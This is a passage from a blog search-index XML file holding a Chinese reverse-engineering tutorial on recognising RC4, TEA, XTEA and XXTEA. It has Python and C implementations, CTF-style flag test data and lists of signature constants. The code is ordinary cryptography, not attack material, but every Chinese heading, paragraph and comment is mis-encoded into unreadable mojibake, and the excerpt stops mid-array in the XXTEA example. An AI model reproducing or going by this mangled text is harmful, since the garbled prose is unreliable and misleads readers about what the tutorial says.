<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>é€†å‘å¸¸è§åŠ å¯†ç®—æ³•</title>
    <link href="/2025/01/19/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <url>/2025/01/19/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="é€†å‘å¸¸è§åŠ å¯†ç®—æ³•"><a href="#é€†å‘å¸¸è§åŠ å¯†ç®—æ³•" class="headerlink" title="é€†å‘å¸¸è§åŠ å¯†ç®—æ³•"></a>é€†å‘å¸¸è§åŠ å¯†ç®—æ³•</h1><h2 id="0x10-RC4"><a href="#0x10-RC4" class="headerlink" title="0x10 RC4"></a>0x10 RC4</h2><h3 id="ç®€ç»"><a href="#ç®€ç»" class="headerlink" title="ç®€ç»"></a>ç®€ç»</h3><p>åœ¨å¯†ç å­¦ä¸­ï¼ŒRC4ï¼ˆRivest Cipher 4ï¼‰æ˜¯ä¸€ç§æµåŠ å¯†ç®—æ³•ï¼Œå¯†é’¥é•¿åº¦å¯å˜ï¼Œå®ƒåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼‰å› æ­¤ä¹Ÿå±äº<strong>å¯¹ç§°åŠ å¯†ç®—æ³•</strong>ï¼ŒRC4æ˜¯æœ‰çº¿ç­‰æ•ˆåŠ å¯†ï¼ˆWEPï¼‰ä¸­é‡‡ç”¨çš„åŠ å¯†ç®—æ³•ï¼Œä¹Ÿæ›¾ç»æ˜¯TLSå¯é‡‡ç”¨çš„ç®—æ³•ä¹‹ä¸€ã€‚</p><p>è¡¥å……è¯´æ˜ï¼šåºåˆ—å¯†ç ï¼ˆæµå¯†ç ï¼‰ï¼š</p><p>æµå¯†ç ä¹Ÿå±äºå¯¹ç§°å¯†ç ï¼Œä½†ä¸åˆ†ç»„åŠ å¯†ç®—æ³•ä¸åŒçš„æ˜¯ï¼Œæµå¯†ç ä¸å¯¹æ˜æ–‡æ•°æ®è¿›è¡Œåˆ†ç»„ï¼Œè€Œæ˜¯ç”¨å¯†é’¥ç”Ÿæˆä¸æ˜æ–‡ä¸€æ ·é•¿çŸ­çš„å¯†ç æµå¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯†ï¼ŒåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒRC4ä¸æ˜¯å¯¹æ˜æ–‡è¿›è¡Œåˆ†ç»„å¤„ç†ï¼Œè€Œæ˜¯å­—èŠ‚æµçš„æ–¹å¼ä¾æ¬¡åŠ å¯†æ˜æ–‡ä¸­çš„æ¯ä¸€ä¸ªå­—èŠ‚ï¼Œè§£å¯†çš„æ—¶å€™ä¹Ÿæ˜¯ä¾æ¬¡å¯¹å¯†æ–‡ä¸­çš„æ¯ä¸€ä¸ªå­—èŠ‚è¿›è¡Œè§£å¯†ã€‚</p><h3 id="è§£å¯†é€»è¾‘"><a href="#è§£å¯†é€»è¾‘" class="headerlink" title="è§£å¯†é€»è¾‘"></a>è§£å¯†é€»è¾‘</h3><p>Sç›’åˆå§‹åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>j = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>    S[i], S[j] = S[j], S[i]<br></code></pre></td></tr></table></figure><p>ç”Ÿäº§å¯†é’¥æµ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">i = j = <span class="hljs-number">0</span><br>key_stream = []<br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>    j = (j + S[i]) % <span class="hljs-number">256</span><br>    S[i], S[j] = S[j], S[i]<br>    key_stream.append(S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br></code></pre></td></tr></table></figure><p>åŠ å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plain)) :<br>    plain[i] ^= key_stream[i]<br><br></code></pre></td></tr></table></figure><p>å®Œæ•´è„šæœ¬ç¤ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_sbox</span>(<span class="hljs-params">key: <span class="hljs-built_in">bytes</span></span>):<br>    s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        s[i], s[j] = s[j], s[i]<br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_encrypt</span>(<span class="hljs-params">key: <span class="hljs-built_in">bytes</span>, plaintext: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    s = init_sbox(key)<br>    i = j = <span class="hljs-number">0</span><br>    ciphertext = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> plaintext:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        s[i], s[j] = s[j], s[i]<br>        k = s[(s[i] + s[j]) % <span class="hljs-number">256</span>]<br>        ciphertext.append(char ^ k)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(ciphertext)<br><br><span class="hljs-comment"># ç¤ºä¾‹ç”¨æ³•</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key = <span class="hljs-string">b&quot;secretkey&quot;</span><br>    plaintext = <span class="hljs-string">b&quot;Hello, RC4 Encryption!&quot;</span><br>    <br>    <span class="hljs-comment"># åŠ å¯†</span><br>    encrypted = rc4_encrypt(key, plaintext)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ciphertext (Hex):&quot;</span>, encrypted.<span class="hljs-built_in">hex</span>())<br><br></code></pre></td></tr></table></figure><h2 id="0x02-TEAç³»åˆ—åŠ å¯†"><a href="#0x02-TEAç³»åˆ—åŠ å¯†" class="headerlink" title="0x02 TEAç³»åˆ—åŠ å¯†"></a>0x02 TEAç³»åˆ—åŠ å¯†</h2><h3 id="ç®€ç»-1"><a href="#ç®€ç»-1" class="headerlink" title="ç®€ç»"></a>ç®€ç»</h3><p>TEAæ˜¯Tiny Encryption Algorithmçš„ç¼©å†™ï¼Œä»¥åŠ å¯†è§£å¯†é€Ÿåº¦å¿«ï¼Œå®ç°ç®€å•è‘—ç§°ã€‚<br>TEAç®—æ³•æ¯ä¸€æ¬¡å¯ä»¥æ“ä½œ64bit(8byte)ï¼Œé‡‡ç”¨128bit(16byte)ä½œä¸ºkeyï¼Œç®—æ³•é‡‡ç”¨è¿­ä»£çš„å½¢å¼ï¼Œæ¨èçš„è¿­ä»£è½®æ•°æ˜¯64è½®ï¼Œæœ€å°‘32è½®ã€‚<br>ä¸ºè§£å†³TEAç®—æ³•å¯†é’¥è¡¨æ”»å‡»çš„é—®é¢˜ï¼ŒTEAç®—æ³•å…ˆåç»å†äº†å‡ æ¬¡æ”¹è¿›ï¼Œ<strong>tea-&gt;xtea-&gt;xxtea</strong>ã€‚<br>TEAç³»åˆ—ç®—æ³•ä¸­å‡ä½¿ç”¨äº†ä¸€ä¸ªDELTAå¸¸æ•°ï¼Œä½†DELTAçš„å€¼å¯¹ç®—æ³•å¹¶æ— ä»€ä¹ˆå½±å“ï¼Œåªæ˜¯ä¸ºäº†é¿å…ä¸è‰¯çš„å–å€¼ï¼Œæ¨èDELTAçš„å€¼å–ä¸ºé»„é‡‘åˆ†å‰²æ•°ä¸232çš„ä¹˜ç§¯ï¼Œå–æ•´åçš„åå…­è¿›åˆ¶å€¼ä¸º0x9e3779B9ï¼Œç”¨äºä¿è¯æ¯ä¸€è½®åŠ å¯†éƒ½ä¸ç›¸åŒã€‚ä½†æœ‰æ—¶è¯¥å¸¸æ•°ä¼šä»¥å‡æ³•çš„å½¢å¼å‡ºç°ï¼Œ-0x61C88647&#x3D;0x9E3779B9ï¼Œå› æ­¤å‡ºç°äº†0x61c88647æ—¶ä¹Ÿåº”å½“æ³¨æ„ã€‚</p><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><h4 id="åŠ å¯†é€»è¾‘"><a href="#åŠ å¯†é€»è¾‘" class="headerlink" title="åŠ å¯†é€»è¾‘"></a>åŠ å¯†é€»è¾‘</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint32_t</span> u32;<br><span class="hljs-type">const</span> u32 delta = <span class="hljs-number">0x9e3779b9</span>; <span class="hljs-comment">//é­”æ•°</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> rounds = <span class="hljs-number">32</span>;        <span class="hljs-comment">//åŠ å¯†è½®æ•°</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> * v , <span class="hljs-type">uint32_t</span> * k)</span> &#123;<br>    u32 v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    u32 k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    u32 sum = <span class="hljs-number">0</span>;<br>    <br><span class="hljs-comment">// TEA</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rounds; i ++) &#123;     <span class="hljs-comment">//åŠ å¯†æµç¨‹</span><br>        sum += delta;<br>        v0 += ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        v1 += ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>    &#125;<br><br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> * v , <span class="hljs-type">uint32_t</span> * k)</span> &#123;<br>    u32 v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    u32 k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    u32 sum = <span class="hljs-number">32</span> * delta;<br>    <br><span class="hljs-comment">// Tea</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rounds; i ++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;<br><br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt_multiple_blocks</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * text , <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * key)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> *v = (<span class="hljs-type">uint32_t</span> *)text;<br>    <span class="hljs-type">uint32_t</span> *k = (<span class="hljs-type">uint32_t</span>*)key;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>)  <span class="hljs-comment">//ä¸€ç»„åªèƒ½åŠ å¯†å…«ä¸ªå­—èŠ‚</span><br>    &#123;<br>        encrypt(v + i, k);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>, v[i], v[i+<span class="hljs-number">1</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x ,&quot;</span>, text[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt_multiple_blocks</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * text , <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * key)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> *v = (<span class="hljs-type">uint32_t</span> *)text;<br>    <span class="hljs-type">uint32_t</span> *k = (<span class="hljs-type">uint32_t</span>*)key;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>)  <span class="hljs-comment">//8ç»„</span><br>    &#123;<br>        decrypt(v + i, k);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è§£å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>, v[i], v[i+<span class="hljs-number">1</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, text[i]);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> keys[] = <span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> plain[] = &#123;<span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x7d</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cipher[] = &#123;<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x20</span> ,<span class="hljs-number">0xf7</span> ,<span class="hljs-number">0xb3</span> ,<span class="hljs-number">0xc5</span> ,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0xce</span> ,<span class="hljs-number">0xda</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x59</span> ,<span class="hljs-number">0x21</span> ,<span class="hljs-number">0x1a</span> ,<span class="hljs-number">0x26</span> ,<span class="hljs-number">0x56</span> ,<span class="hljs-number">0x5a</span> ,<span class="hljs-number">0x59</span> ,<span class="hljs-number">0x29</span> ,<span class="hljs-number">0x2</span> ,<span class="hljs-number">0xd</span> ,<span class="hljs-number">0xed</span> ,<span class="hljs-number">0x7</span> ,<span class="hljs-number">0xa8</span> ,<span class="hljs-number">0xb9</span> ,<span class="hljs-number">0xee</span> ,<span class="hljs-number">0x36</span> ,<span class="hljs-number">0x59</span> ,<span class="hljs-number">0x11</span> ,<span class="hljs-number">0x87</span> ,<span class="hljs-number">0xfd</span> ,<span class="hljs-number">0x5c</span> ,<span class="hljs-number">0x23</span> ,<span class="hljs-number">0x24</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> a;<br>    encrypt_multiple_blocks(plain, keys);<br>    decrypt_multiple_blocks(cipher , keys);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="ç‰¹å¾è¯†åˆ«"><a href="#ç‰¹å¾è¯†åˆ«" class="headerlink" title="ç‰¹å¾è¯†åˆ«"></a>ç‰¹å¾è¯†åˆ«</h4><ul><li>æ ‡å‡†DELTAå¸¸ç†Ÿï¼ˆé­”æ•°ï¼‰</li><li>å¯†é’¥ä¸º16å­—èŠ‚ï¼ˆ4ä¸ªDWORDï¼‰</li><li>åŠ å¯†è½®æ•°ä¸º16&#x2F;32&#x2F;64è½®</li><li>åŠ å¯†ç»“æ„ä¸­å­˜åœ¨å·¦4å³5ä½ç§»å’Œå¾ˆå¤šå¼‚æˆ–</li><li>åŠ å¯†ç»“æ„ä¸­å­˜åœ¨è½®åŠ &#x2F;å‡ç›¸åŒå¸¸ç†Ÿçš„è¯­å¥</li></ul><h3 id="xTEA"><a href="#xTEA" class="headerlink" title="xTEA"></a>xTEA</h3><h4 id="åŠ å¯†é€»è¾‘-1"><a href="#åŠ å¯†é€»è¾‘-1" class="headerlink" title="åŠ å¯†é€»è¾‘"></a>åŠ å¯†é€»è¾‘</h4><p>åŒºåˆ«äºTEAåŠ å¯†çš„åªæœ‰è½®åŠ å¯†è¿‡ç¨‹ï¼Œé­”æ•°éƒ½ä¹Ÿä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//encryptè¿‡ç¨‹</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rounds; i ++) &#123;<br>    v0 += (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="hljs-number">3</span>]);<br>    sum += delta;<br>    v1 += (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + k[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>&#125;<br><span class="hljs-comment">//decryptè¿‡ç¨‹</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rounds; i ++) &#123;<br>    v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + k[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>    sum -= delta;<br>    v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="hljs-number">3</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç‰¹å¾è¯†åˆ«-1"><a href="#ç‰¹å¾è¯†åˆ«-1" class="headerlink" title="ç‰¹å¾è¯†åˆ«"></a>ç‰¹å¾è¯†åˆ«</h4><ul><li>åŒTEAåŠ å¯†</li><li>åŠ å¯†ç»“æ„ä¸­å­˜åœ¨å³ç§»11ä½å¹¶3çš„è¿ç®—</li></ul><h3 id="xxTEA"><a href="#xxTEA" class="headerlink" title="xxTEA"></a>xxTEA</h3><h4 id="åŠ å¯†é€»è¾‘-2"><a href="#åŠ å¯†é€»è¾‘-2" class="headerlink" title="åŠ å¯†é€»è¾‘"></a>åŠ å¯†é€»è¾‘</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint32_t</span> u32;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9 <span class="hljs-comment">//é­”æ•°</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="hljs-string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">xxtea</span><span class="hljs-params">(u32* v , <span class="hljs-type">int</span> n , u32* key)</span>&#123;<br>    u32 y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br><br>    <span class="hljs-keyword">if</span>(n &gt; <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">//æ­£æ•°åŠ å¯† å¤æ•°è§£å¯†</span><br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;  <span class="hljs-comment">//ç‰¹å¾è¯†åˆ«</span><br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span>&#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p ++ )&#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">-1</span>) &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span>&#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p --)&#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> keys[] = <span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> plain[] = &#123;<span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x58</span>, 